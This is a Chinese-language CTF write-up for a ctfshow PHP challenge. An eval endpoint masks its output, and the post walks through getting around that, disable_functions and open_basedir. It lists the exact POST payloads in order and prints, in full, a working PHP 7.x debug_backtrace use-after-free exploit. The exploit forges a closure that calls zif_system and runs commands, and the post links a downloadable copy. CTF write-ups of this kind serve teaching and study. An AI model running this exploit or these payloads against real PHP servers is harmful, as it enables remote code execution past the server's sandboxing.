---
layout: post
title: eval 之后把输出打码：一条从源码到 flag 的链
summary: 参数进 eval，输出被 preg_replace 打码。靠类绕开 disable_functions 读源码，靠 glob:// 定位文件，最后用 UAF 把函数表改回来。
tags: PHP 代码执行 UAF
date: 2026-10-18 07:20:00 +0800
---

打开就是三条 warning 加一句"你要上天吗？"：

```
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 24
你要上天吗？
```

`highlight_file` 也被禁了，所以源码看不到。但这三条 warning 反而把行号递了过来：14、15 行在关错误显示，24 行本来要 `highlight_file(__FILE__)`。

## 参数在第 19 行

`?cmd=`、`?a=`、Cookie、几个自定义头、PUT，全都试过，响应一模一样。GET 参数名一个个撞也没有。

改成一个更笨但更有效的办法：**把参数名当数组传**。PHP 在遇到"数组被当字符串用"时会自己报出位置：

```
POST c[]=1
→ Notice: Array to string conversion in /var/www/html/index.php on line 19
→ Parse error: syntax error, unexpected end of file, expecting '('
  in /var/www/html/index.php(19) : eval()'d code
```

一句话把两件事都给了：参数是 **POST 的 `c`**，第 19 行是 **`eval()`**。

## 源码

```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
```

真正卡人的不是 `eval`，是它后面那四行：输出先进 ob 缓冲，取出来、清空，整体过一遍 `preg_replace("/[0-9]|[a-z]/i","?")`，再 echo。

**打码发生在输出侧，不在执行侧。** 所以 `c=phpinfo()` 不是没跑，是跑完了结果被换成了问号 —— 页面看起来一样，这条最骗人。

## 绕过打码：换通道

既然打码只作用在 `$s` 这个缓冲区上，那就不要走它。

`fopen` / `fwrite` / `file_put_contents` 都在 `disable_functions` 里，但 `SplFileObject` 是**类** —— `disable_functions` 只能禁函数，禁不了类：

```php
$o = new SplFileObject($_SERVER[SCRIPT_FILENAME].x, $_SERVER[HTTP_USER_AGENT]);
$o->fwrite(implode(PHP_EOL, scandir($_SERVER[DOCUMENT_ROOT])));
```

打开模式从 User-Agent 拿（少写一对引号），输出文件是 `index.php` 后面接个 `x`。nginx 按静态文件把它发出来，**不进 PHP，自然也不经过那层打码**。源码、目录、`ini_get` 的值，全是这么落盘再读的。

## 两层限制，两种原理

读出来的 `disable_functions` 长到不像话，连 `echo`、`print`、`include`、`phpinfo` 都在里面（前两个是语言结构，禁不掉，作者大概图一乐），还有 `pwn`、`getTrace` 这种根本不存在的名字。

两条实测结论：

- **`get_defined_functions()` 里列着 ≠ 能用。** `system`、`exec`、`copy`、`symlink` 都列着，实际调用全部静默失败。
- **类不受 `disable_functions` 约束。** `SplFileObject`、`DirectoryIterator` 能用，原因就在这里。

第二层是 `open_basedir = /var/www/html/`。它的检查原理是**路径前缀匹配**，而且比的是**解析之后**的路径：

```php
SplFileObject::__construct(): open_basedir restriction in effect.
File(/flag0.txt) is not within the allowed path(s): (/var/www/html/)
```

所以 `..`、`//`、`/proc/self/root`、`file://`、`php://filter`、`compress.zlib://`、`phar://` 全部无效 —— 换包装器没用，它比的是最终路径。

`.user.ini` 这条路我也试了：写进去了，但 PHP **不允许 per-dir 配置把 `open_basedir` 放宽**（只能收紧），所以不生效。`ini_set` 本身也在禁用列表里。

## 唯一的裂缝：glob://

`glob://` 包装器列目录不受这层检查约束：

```php
foreach(new DirectoryIterator('glob:///*') as $f) { echo $f->__toString(); }
```

根目录下有个 **`/flag0.txt`**。

但它只能列，不能开流：

```
SplFileObject::__construct(glob:///flag0.txt): wrapper does not support stream open
```

`openFile()` 也会重查一遍。**知道文件在哪，打不开** —— 到这一步，PHP 层的路是死的：读接口全禁、写接口全禁、能列的不能读，`copy`/`rename`/`link`/`symlink` 也全禁。

## 换层：为什么要 UAF

前面所有招都停在 PHP 的"文件层"：`open_basedir` 在每次打开文件前比路径，`disable_functions` 在每次调用函数前查表。只要还在这两层里打转，换多少 payload、换多少包装器，都是同一堵墙。

那就换个思路：不申请打开文件，直接**把函数表改回来**。

`disable_functions` 的实现并不神秘 —— PHP 启动时把名单里的函数**从全局函数表里摘掉**，之后调用查不到，就报 "has been disabled"。它保护的是"查表这个动作"，**不是进程内存**。内存里那张表、那些函数体都还在，只是没人指给你看。

## UAF 是怎么给到这一步的

漏洞在 `debug_backtrace()` / `Exception::getTrace()` 的实现上（PHP 7.0–7.4）。它要记录"这次调用的参数"，而在某些路径下，它记的是**引用**：

```php
class Vuln {
    public $a;
    public function __destruct() {
        global $backtrace;
        unset($this->a);                           // ① 字符串被释放
        $backtrace = (new Exception)->getTrace();  // ② 紧接着拍栈帧快照
    }
}
```

对象析构时先 `unset` 自己的属性（字符串被 free），紧接着 `getTrace()` 去拍快照 —— 而它对着那块**已经释放的内存**留了个引用。于是 `$backtrace[1]['args'][0]` 拿到的是一个"PHP 认为它还活着、其实已经被回收"的字符串。

这个"僵尸字符串"有意思的地方在于：它的**内存会被后续的分配复用**。脚本紧接着分配一堆同样长度的字符串（`str_shuffle(str_repeat('A', 79))`，用 `str_shuffle` 是为了躲开 opcache 的字符串驻留），其中一个正好落在这块内存上：

```
      $abc 的数据区
      ┌────────────────────────────────┐
      │ 同一块内存，两个"主人"          │
      │  A: 我以为的那个字符串          │
      │  B: 另一个对象的 zend_string 头 │
      └────────────────────────────────┘
```

结果就是**同一块内存有两个主人**：我按"字符串"去读写它，实际改的是另一个对象的结构体字段。任意读写的来源不是"PHP 给了我一个危险函数"，而是**两个结构体叠在了一起**。

## 四步把它变成命令执行

**第一步：把"长度"变成读内存的工具。**
`zend_string` 的布局是 `[gc][h][len][val...]`。我把 `$abc` 里对应 `len` 的位置写上"目标地址 - 0x10"，`strlen($abc)` 读出来的就不再是我的长度，而是**目标内存里的那个值**。脚本里的 `leak()` 就是干这个的：写一次指针，读一次 `strlen`，等于读 8 字节内存。

**第二步：找到 PHP 自己的地址。**
先从一个闭包对象的 handler 里泄出一个函数指针，拿它当锚点，按页往上扫，认 ELF 头（`0x7f454c46...`）找到二进制基址；再解析 ELF 的 program header，取出 `.data` 段的地址和大小 —— `basic_functions` 表就在那里面。

**第三步：在函数表里按名字认函数。**
`basic_functions` 是一串 `zend_internal_function` 结构，每条含名字指针和 handler 指针。脚本按 `0x20` 步长遍历，先认 `constant`、`bin2hex` 这两个名字做对齐校验，再找 `fname == "system"` 的那一条 —— 拿到它的 handler，就是 `zif_system`。

**这个函数体一直都在内存里，`disable_functions` 只是没让我从表里查到它。**

**第四步：造一个假闭包，把 handler 换成 zif_system。**

```php
write($abc, 0x20, $abc_addr + $fake_obj_offset);   // 让"我的对象"指向伪造区
write($abc, 0xd0 + 0x38, 1, 4);                    // 类型：内部函数
write($abc, 0xd0 + 0x68, $zif_system);             // handler：直接就是 zif_system

($helper->b)($cmd);                                 // 看起来是调一个闭包
```

最后一行**表面上是调用一个 PHP 闭包**，实际走的是 `zif_system($cmd)`。中间没有任何"查函数表 → 发现被禁用 → 拒绝"的机会 —— 因为这次调用压根不查表。

## 读到的东西

```
ctfshow{...}
```

## 操作步骤

按顺序发这几个请求就行，参数名都是 `c`，POST。

**一、确认参数在哪**

```
c[]=1
```

响应会多出两行：

```
Notice: Array to string conversion in /var/www/html/index.php on line 19
Parse error: syntax error, unexpected end of file, expecting '('
  in /var/www/html/index.php(19) : eval()'d code
```

**二、把源码写到静态文件**

`c` 传：

```php
$o=new SplFileObject($_SERVER[SCRIPT_FILENAME].x,$_SERVER[HTTP_USER_AGENT]);
$s=new SplFileObject($_SERVER[SCRIPT_FILENAME]);
foreach($s as $l){$o->fwrite($l);}
```

User-Agent 必须是 `w`（这是 `SplFileObject` 的打开模式）。发完 `GET /index.phpx` 拿源码 —— `index.phpx` 就是 `SCRIPT_FILENAME`（`/var/www/html/index.php`）后面接一个 `x`，nginx 当静态文件发，不进 PHP，所以不打码。

**三、列根目录**

`c` 传：

```php
$o=new SplFileObject($_SERVER[SCRIPT_FILENAME].z,$_SERVER[HTTP_USER_AGENT]);
$g=[];
foreach(new DirectoryIterator($_SERVER[HTTP_REFERER]) as $f){$g[]=$f->getPathname();}
$o->fwrite(implode(PHP_EOL,$g));
```

Referer 传 `glob:///*`，User-Agent 传 `w`，然后 `GET /index.phpz`。

这里为什么不直接 `echo` 输出：`echo` 是能用的，但输出会过一遍打码，路径里的字母全变问号，所以还得落盘。

**四、跑 UAF**

`c` 传整段脚本。脚本里把命令写死成把 flag 搬到 web 根：

```
cat /flag0.txt > /var/www/html/f.txt 2>&1
```

```php
pwn("cat /flag0.txt > /var/www/html/f.txt 2>&1");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= pack('C',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = pack('C',$v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```

**五、取回 flag**

```
GET /f.txt
```

脚本里只有三处和原版不同：`str_repeat('A',79)` 换成 79 个 A 的字面量（`str_repeat` 被禁）、两处 `chr(...)` 换成 `pack('C',...)`（`chr` 被禁）、命令换成写文件（避免输出打码）。`str_shuffle` 保留 —— 它没被禁，而且它防的是 opcache 的字符串驻留，去掉整个 UAF 会失败。

完整脚本也放了一份可下载：[`uaf.php`](/assets/files/ctfshow-eval-uaf/uaf.php)。

## 留在手里的三条

- **打在输出上的过滤，绕法永远在输出侧。** 判断"有没有进去"不能看回显，要看副作用（我这次是落盘）。
- **函数清单不是可用性清单。** 列着 `system` 不等于能调，能调也不等于有输出 —— 三件事分开验。
- **限制的层次决定了绕过的层次。** 三个限制各管一层：`preg_replace` 管输出、`disable_functions` 管函数表查找、`open_basedir` 管路径检查。在同一层里换 payload、换包装器都是在跟同一堵墙较劲；墙在哪一层，就在哪一层想办法 —— 这句话比这个 UAF 本身更值得记。
